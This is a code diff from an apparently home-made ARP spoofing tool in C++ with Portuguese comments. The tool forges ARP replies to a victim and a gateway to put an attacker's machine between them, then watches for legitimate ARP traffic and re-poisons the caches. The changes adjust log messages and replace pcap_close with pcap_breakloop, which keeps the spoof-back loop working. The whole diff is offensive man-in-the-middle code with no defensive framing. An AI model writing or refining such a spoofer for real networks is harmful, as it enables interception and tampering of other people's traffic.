@@ -39,6 +39,7 @@ void Spoofer::spoof(){
 		// Spoofando de novo
 		toVictim.send();
 		toGateway.send();
+		printf("\nENVIANDO SPOOFS!\n");
 
 		sniffer.listen(spoofBack);
 	} while(true);
@@ -51,21 +52,18 @@ void Spoofer::spoofBack(u_char* args, const struct pcap_pkthdr* header, const un
 	if(htons(ether.ptype) == ETHERTYPE_ARP){
 		ARP arp((unsigned char*) packet);
 
-		printf("Op: %d\nDe: %s   %s\nPara: %s    %s\n",
-				htons(arp.arpOp),
+		printf("%s de %s para %s\n",
+				htons(arp.arpOp) == ARPOP_REPLY ? "REPLY" : "REQUEST",
 				Host::ipToString(arp.spaddr).c_str(),
-				Host::macToString(arp.shaddr).c_str(),
-				Host::ipToString(arp.tpaddr).c_str(),
-				Host::macToString(arp.thaddr).c_str()
-				);
-		printf("\nMAC do ARP: %2x %2x %2x %2x %2x %2x \n",arp.shaddr[0], arp.shaddr[1], arp.shaddr[2], arp.shaddr[3], arp.shaddr[4], arp.shaddr[5]);
+				Host::ipToString(arp.tpaddr).c_str()
+		);
 
 		/* Se algumas das vitimas manda um ARP Reply valido (sem o MAC do atacante como sender) */
 		if(htons(arp.arpOp) == ARPOP_REPLY){
 			if((arp.spaddr == Globals::victim.ip || arp.spaddr == Globals::gateway.ip)
 			   && memcmp(arp.shaddr, Globals::attacker.mac->ether_addr_octet,6)){
 				printf ("Target: %s sent legitimate ARP packet. Spoof back...\n", Host::ipToString(arp.spaddr).c_str());
-				pcap_close(pcapContext);
+				pcap_breakloop(pcapContext);
 			}
 
 		/* Se alguem manda um ARP Request perguntando quem é uma das vítimas */
@@ -73,7 +71,7 @@ void Spoofer::spoofBack(u_char* args, const struct pcap_pkthdr* header, const un
 			if((arp.tpaddr == Globals::victim.ip || arp.tpaddr == Globals::gateway.ip)
 			  && memcmp(arp.shaddr, Globals::attacker.mac->ether_addr_octet, 6)){
 				printf ("Someone is asking for the MAC of one of the targets... Spoof back!\n");
-				pcap_close(pcapContext);
+				pcap_breakloop(pcapContext);
 			}
 		}
 	}
